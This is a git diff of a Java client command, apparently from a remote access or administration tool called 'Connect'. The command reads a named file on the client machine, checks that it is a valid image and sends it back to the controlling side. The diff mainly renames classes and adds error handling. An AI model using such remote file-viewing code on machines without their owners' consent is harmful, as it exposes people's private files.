@@ -6,8 +6,8 @@ package br.com.introcdc.connect.client.commands.file.navigation;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
-import br.com.introcdc.connect.client.components.ImageComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
+import br.com.introcdc.connect.client.components.ClientImageComponents;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
@@ -25,7 +25,7 @@ public class ClientCommandView extends ClientCommand {
             msg("Digite um arquivo!");
             return;
         }
-        File file = FileComponents.file(input);
+        File file = ClientFileComponents.file(input);
         if (!file.exists() || file.isDirectory()) {
             msg("Arquivo não encontrado!");
             return;
@@ -36,10 +36,15 @@ public class ClientCommandView extends ClientCommand {
             return;
         }
 
+        BufferedImage image = ImageIO.read(file);
+        if (image == null) {
+            msg("O arquivo selecionado não é uma imagem válida ou está corrompido!");
+            return;
+        }
+
         msg("Enviando visualização do arquivo " + file.getName() + "...");
         msg("view-image");
-        BufferedImage image = ImageIO.read(file);
-        ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> ImageComponents.sendImage(5, image)).start(), Connect.DELAY, Connect.DELAY_TYPE);
+        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(() -> ClientImageComponents.sendImage(5, image)).start()), Connect.DELAY, Connect.DELAY_TYPE);
     }
 
 }
